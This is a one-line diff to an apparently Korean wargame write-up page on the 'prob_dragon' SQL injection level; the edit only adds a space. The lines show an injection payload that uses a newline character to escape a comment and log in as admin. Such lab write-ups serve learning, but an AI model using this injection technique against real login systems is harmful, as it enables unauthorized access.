@@ -3149,7 +3149,7 @@ section 진행 기간
 <br>
 
 <p><code>pw</code> 인자 부분에 <code>개행문자(%0a)</code>를 넣어 쿼리문을 완성 시키겠습니다.</p>
-<p><code>select id from prob_dragon where id=&#39;guest&#39;</code><font color="green"><del># and pw=’’</del></font><code>%0a and pw=&#39;1&#39; or id=&#39;admin&#39;%23&#39;</code> </p>
+<p><code>select id from prob_dragon where id=&#39;guest&#39;</code><font color="green"><del># and pw=’’</del></font> <code>%0a and pw=&#39;1&#39; or id=&#39;admin&#39;%23&#39;</code> </p>
 <p>위 쿼리문을 넣으면 우회가 됩니다.</p>
 <br>
 
